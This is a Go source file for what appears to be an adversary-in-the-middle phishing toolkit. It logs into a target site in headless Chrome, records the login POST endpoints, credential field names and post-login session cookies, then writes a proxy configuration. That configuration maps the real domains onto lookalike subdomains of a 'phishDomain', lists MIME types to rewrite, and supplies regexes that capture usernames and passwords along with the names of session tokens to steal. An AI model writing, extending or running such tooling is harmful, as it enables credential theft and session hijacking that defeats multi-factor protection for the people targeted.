package main

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/chromedp"
)

// DynamicProfile is what we learn by driving a real login in headless Chrome.
type DynamicProfile struct {
	Domains       map[string]bool
	PostEndpoints []string
	PostFields    map[string]bool
	LoginCookies  []string
	AllCookies    []string
	FinalURL      string
	ServiceHost   string
}

func (d *DynamicProfile) report() string {
	var b strings.Builder
	fmt.Fprintf(&b, "\n═══ DYNAMIC PROFILE ═══\n")
	fmt.Fprintf(&b, "Final URL:     %s\n", d.FinalURL)
	fmt.Fprintf(&b, "Service host:  %s  (→ ServiceUpstream)\n", d.ServiceHost)
	fmt.Fprintf(&b, "Auth POST endpoints:\n")
	for _, e := range d.PostEndpoints {
		fmt.Fprintf(&b, "  - %s\n", e)
	}
	fmt.Fprintf(&b, "POST fields:   %v\n", sortedKeys(d.PostFields))
	fmt.Fprintf(&b, "Auth cookies (first-party, new after login):\n")
	for _, c := range d.LoginCookies {
		fmt.Fprintf(&b, "  - %s\n", c)
	}
	fmt.Fprintf(&b, "First-party domains: %d\n", len(d.Domains))
	return b.String()
}

func dynamicProfile(loginURL, username, password string, static *Profile, headless bool) (*DynamicProfile, error) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", headless),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
	)
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, cancel := chromedp.NewContext(allocCtx, chromedp.WithLogf(func(string, ...interface{}) {}))
	defer cancel()
	ctx, cancel = context.WithTimeout(ctx, 90*time.Second)
	defer cancel()

	dp := &DynamicProfile{Domains: map[string]bool{}, PostFields: map[string]bool{}}
	loginBase := baseDomain(hostOf(loginURL))

	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch e := ev.(type) {
		case *network.EventRequestWillBeSent:
			if u, err := url.Parse(e.Request.URL); err == nil && u.Host != "" {
				h := u.Hostname()
				if !isBlockedProfileDomain(h) {
					dp.Domains[h] = true
				}
			}
			// Only mine POST fields from auth endpoints — not the post-login mail API.
			if strings.EqualFold(e.Request.Method, "POST") && isAuthURL(e.Request.URL) {
				dp.PostEndpoints = append(dp.PostEndpoints, e.Request.URL)
				var postData string
				for _, entry := range e.Request.PostDataEntries {
					postData += entry.Bytes
				}
				if postData != "" {
					parsePostFields(postData, dp.PostFields)
				}
			}
		}
	})

	if err := chromedp.Run(ctx, network.Enable()); err != nil {
		return nil, fmt.Errorf("enable network: %w", err)
	}
	if err := chromedp.Run(ctx, chromedp.Navigate(loginURL)); err != nil {
		return nil, fmt.Errorf("navigate: %w", err)
	}

	userSel, passSel := loginSelectors(static)
	if err := chromedp.Run(ctx, chromedp.WaitVisible(passSel, chromedp.ByQuery)); err != nil {
		return nil, fmt.Errorf("password field %q not found: %w", passSel, err)
	}

	// Baseline cookie names (pre-login).
	baseline := map[string]bool{}
	if err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
		cks, err := storage.GetCookies().Do(ctx)
		if err != nil {
			return err
		}
		for _, c := range cks {
			baseline[c.Name] = true
		}
		return nil
	})); err != nil {
		return nil, err
	}

	if err := chromedp.Run(ctx,
		chromedp.SendKeys(userSel, username, chromedp.ByQuery),
		chromedp.Sleep(300*time.Millisecond),
		chromedp.SendKeys(passSel, password, chromedp.ByQuery),
		chromedp.Sleep(300*time.Millisecond),
		chromedp.SendKeys(passSel, "\r", chromedp.ByQuery),
	); err != nil {
		return nil, fmt.Errorf("fill/submit: %w", err)
	}

	waitForLogin(ctx, loginURL, 30*time.Second)

	// Final URL → ServiceUpstream (grab before cookies so we can filter by it).
	var finalURL string
	if err := chromedp.Run(ctx, chromedp.Location(&finalURL)); err == nil {
		dp.FinalURL = finalURL
		dp.ServiceHost = hostOf(finalURL)
	}
	serviceBase := baseDomain(dp.ServiceHost)

	// Post-login cookies: keep only FIRST-PARTY ones (login/service domains),
	// diff against baseline, drop tracking cookies.
	if err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
		cks, err := storage.GetCookies().Do(ctx)
		if err != nil {
			return err
		}
		for _, c := range cks {
			if !isFirstPartyCookie(c.Domain, loginBase, serviceBase) {
				continue
			}
			dp.AllCookies = append(dp.AllCookies, c.Name)
			if !baseline[c.Name] && c.Value != "" && !isTrackingCookie(c.Name) {
				dp.LoginCookies = append(dp.LoginCookies, c.Name)
			}
		}
		return nil
	})); err != nil {
		return nil, err
	}

	return dp, nil
}

// ── selectors / submission ──

func loginSelectors(p *Profile) (userSel, passSel string) {
	passSel = `input[type="password"]`
	userSel = `input[type="email"], input[type="text"]`
	if p != nil && len(p.PassFields) > 0 {
		passSel = fmt.Sprintf(`input[name="%s"]`, p.PassFields[0])
	}
	if p != nil && len(p.UserFields) > 0 {
		userSel = fmt.Sprintf(`input[name="%s"]`, p.UserFields[0])
	}
	return userSel, passSel
}

func parsePostFields(postData string, fields map[string]bool) {
	trimmed := strings.TrimSpace(postData)
	if strings.HasPrefix(trimmed, "{") { // JSON body
		re := regexp.MustCompile(`"([a-zA-Z0-9_\-]+)"\s*:`)
		for _, m := range re.FindAllStringSubmatch(trimmed, -1) {
			fields[m[1]] = true
		}
		return
	}
	// form-encoded (skip multipart/base64 blobs)
	if strings.Contains(postData, "------") || len(postData) > 4096 {
		return
	}
	for _, kv := range strings.Split(postData, "&") {
		parts := strings.SplitN(kv, "=", 2)
		if len(parts) == 2 && parts[0] != "" && len(parts[0]) < 64 {
			fields[parts[0]] = true
		}
	}
}

func waitForLogin(ctx context.Context, loginURL string, maxWait time.Duration) {
	deadline := time.Now().Add(maxWait)
	startHost := hostOf(loginURL)
	lastURL, changed := "", false
	stableSince := time.Now()
	for time.Now().Before(deadline) {
		var cur string
		if err := chromedp.Run(ctx, chromedp.Location(&cur)); err == nil {
			if hostOf(cur) != startHost {
				changed = true
			}
			if changed {
				if cur != lastURL {
					lastURL = cur
					stableSince = time.Now()
				} else if time.Since(stableSince) > 3*time.Second {
					return
				}
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// ── filtering helpers ──

func hostOf(rawURL string) string {
	if u, err := url.Parse(rawURL); err == nil {
		return u.Hostname()
	}
	return ""
}

func baseDomain(host string) string {
	host = strings.ToLower(host)
	parts := strings.Split(host, ".")
	if len(parts) >= 2 {
		return parts[len(parts)-2] + "." + parts[len(parts)-1]
	}
	return host
}

func isFirstPartyCookie(domain string, bases ...string) bool {
	d := strings.ToLower(strings.TrimPrefix(domain, "."))
	for _, b := range bases {
		if b == "" {
			continue
		}
		if d == b || strings.HasSuffix(d, "."+b) {
			return true
		}
	}
	return false
}

func isAuthURL(u string) bool {
	lower := strings.ToLower(u)
	for _, k := range []string{"login", "signin", "sign-in", "auth", "saml",
		"credential", "authenticate", "oauth", "bizidp"} {
		if strings.Contains(lower, k) {
			return true
		}
	}
	return false
}

// Third-party ad-tech / analytics domains to exclude from the proxy target.
var profileDomainBlocklist = []string{
	"google-analytics.com", "googletagmanager.com", "doubleclick.net",
	"taboola.com", "demdex.net", "agkn.com", "semasio.net", "media6degrees.com",
	"crazyegg.com", "hubspot.com", "hs-scripts.com", "hs-analytics.net",
	"hs-banner.com", "hsforms.com", "usemessages.com", "sitescdn.net",
	"visualwebsiteoptimizer.com", "mczbf.com", "tsdtocl.com", "bing.com",
	"accounts.google.com", "rlcdn.com", "rubiconproject.com", "pubmatic.com",
	"openx.net", "casalemedia.com", "indexww.com", "linkedin.com", "adsrvr.org",
	"mathtag.com", "scorecardresearch.com", "quantserve.com", "adnxs.com",
	"criteo.com", "outbrain.com", "yieldmo.com", "bidswitch.net", "sharethis.com",
	"intentiq.com", "tapad.com", "turn.com", "krxd.net", "exelator.com",
	"bluekai.com", "33across.com", "contextweb.com", "smartadserver.com",
	"thebrighttag.com", "everesttech.net", "liadm.com", "id5-sync.com",
	"onetrust.com", "cookielaw.org", "amazon-adsystem.com", "moatads.com",
}

func isBlockedProfileDomain(d string) bool {
	d = strings.ToLower(d)
	for _, b := range profileDomainBlocklist {
		if d == b || strings.HasSuffix(d, "."+b) {
			return true
		}
	}
	return false
}

var trackingPrefixes = []string{
	"_ga", "_gid", "_vwo", "_vis", "fb_", "_ce", "cj", "BL", "YSB_",
	"AMP_", "optimizely", "mkto", "_uet", "_clck", "_clsk", "YM.SSRBDGT",
}

func isTrackingCookie(name string) bool {
	n := strings.ToLower(name)
	for _, p := range trackingPrefixes {
		if strings.HasPrefix(n, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

func sortedKeys(m map[string]bool) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// ── config generation (merges static + dynamic, filtered) ──

func generateConfigFull(static *Profile, dyn *DynamicProfile, key string) string {
	domainSet := map[string]bool{}
	var domains []string
	addD := func(d string) {
		d = strings.ToLower(d)
		if d == "" || d == phishDomain || strings.HasSuffix(d, "."+phishDomain) {
			return
		}
		if isBlockedProfileDomain(d) {
			return
		}
		if !domainSet[d] {
			domainSet[d] = true
			domains = append(domains, d)
		}
	}
	if dyn != nil {
		for d := range dyn.Domains {
			addD(d)
		}
	}
	if static != nil {
		for _, d := range static.Domains {
			addD(d)
		}
	}
	sort.Strings(domains)

	entryHost := ""
	if static != nil {
		entryHost = hostOf(static.FinalURL)
	}
	if entryHost == "" && len(domains) > 0 {
		entryHost = domains[0]
	}

	phishFor := map[string]string{}
	phishFor[entryHost] = key + "." + phishDomain
	for _, d := range domains {
		if _, ok := phishFor[d]; ok {
			continue
		}
		phishFor[d] = key + "-" + strings.ReplaceAll(d, ".", "-") + "." + phishDomain
	}

	var credFields []string
	if dyn != nil && len(dyn.PostFields) > 0 {
		credFields = sortedKeys(dyn.PostFields)
	} else if static != nil {
		credFields = append(append([]string{}, static.UserFields...), static.PassFields...)
	}

	var b strings.Builder
	fmt.Fprintf(&b, "\t// ── %s (auto-profiled from %s) ──\n", key, startURLOf(static))
	fmt.Fprintf(&b, "\t%q: {\n", key)
	fmt.Fprintf(&b, "\t\tName:           %q,\n", key)
	fmt.Fprintf(&b, "\t\tEntrySubdomain: %q,\n", phishFor[entryHost])

	fmt.Fprintf(&b, "\t\tHostMap: map[string]string{\n")
	for _, d := range domains {
		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", phishFor[d], d)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tReverseMap: map[string]string{\n")
	for _, d := range domains {
		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", d, phishFor[d])
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tModifyMimes: map[string]bool{\n")
	for _, m := range []string{"text/html", "application/json", "application/javascript",
		"application/x-javascript", "text/javascript", "text/plain"} {
		fmt.Fprintf(&b, "\t\t\t%q: true,\n", m)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tCredPatterns: []*regexp.Regexp{\n")
	for _, pat := range credPatternsFrom(credFields) {
		fmt.Fprintf(&b, "\t\t\tregexp.MustCompile(`%s`),\n", pat)
	}
	fmt.Fprintf(&b, "\t\t},\n")

	fmt.Fprintf(&b, "\t\tAuthTokenNames: map[string]bool{\n")
	if dyn != nil && len(dyn.LoginCookies) > 0 {
		for _, c := range dedupe(dyn.LoginCookies) {
			fmt.Fprintf(&b, "\t\t\t%q: true,\n", c)
		}
	} else {
		fmt.Fprintf(&b, "\t\t\t// TODO: run with -user/-pass to auto-fill\n")
	}
	fmt.Fprintf(&b, "\t\t},\n")

	if dyn != nil && dyn.ServiceHost != "" {
		fmt.Fprintf(&b, "\t\tServiceUpstream: %q,\n", dyn.ServiceHost)
	} else {
		fmt.Fprintf(&b, "\t\t// TODO: ServiceUpstream (run with -user/-pass)\n")
	}

	if static != nil {
		fmt.Fprintf(&b, "\t\tEntryPath:  %q,\n", static.LoginPath)
		fmt.Fprintf(&b, "\t\tEntryQuery: %q,\n", static.LoginQuery)
	}
	fmt.Fprintf(&b, "\t},\n")
	return b.String()
}

func startURLOf(p *Profile) string {
	if p != nil {
		return p.StartURL
	}
	return "?"
}

func credPatternsFrom(fields []string) []string {
	seen := map[string]bool{}
	var pats []string
	for _, f := range fields {
		f = strings.ToLower(strings.TrimSpace(f))
		if f == "" || seen[f] || len(f) > 40 {
			continue
		}
		seen[f] = true
		q := regexp.QuoteMeta(f)
		pats = append(pats, fmt.Sprintf(`(?i)%s=([^&\s]+)`, q))
		pats = append(pats, fmt.Sprintf(`(?i)"%s"\s*:\s*"([^"]+)"`, q))
	}
	if len(pats) == 0 {
		pats = append(pats, `(?i)login=([^&\s]+)`, `(?i)username=([^&\s]+)`,
			`(?i)password=([^&\s]+)`, `(?i)passwd=([^&\s]+)`)
	}
	return pats
}

func dedupe(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}
